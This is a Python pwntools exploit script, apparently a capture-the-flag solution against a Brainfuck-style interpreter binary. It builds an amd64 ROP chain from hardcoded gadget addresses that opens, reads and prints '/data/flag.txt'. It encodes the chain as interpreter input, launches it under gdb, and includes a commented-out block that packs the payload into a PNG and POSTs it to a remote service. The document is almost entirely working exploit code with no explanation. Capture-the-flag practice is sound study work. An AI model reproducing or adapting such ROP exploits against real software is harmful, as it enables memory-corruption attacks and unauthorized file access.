from pwn import *
import requests
from PIL import Image

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
brkpts = '''
b * 0x401feb
c
'''

pop_rdi = 0x00000000004018da # : pop rdi ; ret
pop_rsi = 0x0000000000402a38
pop_rdx = 0x00000000004017df
pop_rax = 0x000000000045cd07
syscall = 0x00426194
mov_rdi = 0x000000000045960f # : mov qword ptr [rdi], rsi ; ret
bss = 0x4e4f00
rop = flat([
    pop_rax, 2,
    pop_rdi, bss + 8,
    pop_rsi, 0x7478742e6761,
    mov_rdi,
    pop_rdi, bss,
    pop_rsi, 0x6c662f617461642f,
    mov_rdi,
    pop_rsi, 0,
    pop_rdx, 0,
    syscall,
    pop_rax, 0,
    pop_rdi, 3,
    pop_rsi, bss,
    pop_rdx, 50,
    syscall,
    pop_rax, 1,
    pop_rdi, 1,
    syscall
])

rop = rop.replace(b"\x00", b"\x04")
payload = ""
for i in range(len(rop)):
    if rop[i] == 4:
        payload += ',' + '-'*0x4 + '>'
    else:
        payload += ',>'

bf = ">"*0x98 + payload

io = gdb.debug(["./interpreter", bf, rop.decode('latin1')], brkpts)
# io = process(["./interpreter", bf, rop])
io.interactive()

'''
im = Image.new(mode="RGB", size=(len(bf), 1))

colors = {'>' : (255,0,0), '-' : (0,255,255), ',' : (102,0,204)}

for i in range(len(bf)):
    im.putpixel((i, 0), colors[bf[i]])

im.save('bfimg.png', 'png')

files = {'file' : open('bfimg.png','rb')}
# url = 'http://40.71.72.198:8080/'
url = 'http://0.0.0.0:6969/'
values = {'text' : rop.decode('latin1'), 'submit' : 'Submit'}
r = requests.post(url, files=files, data=values)

print(r.text)
'''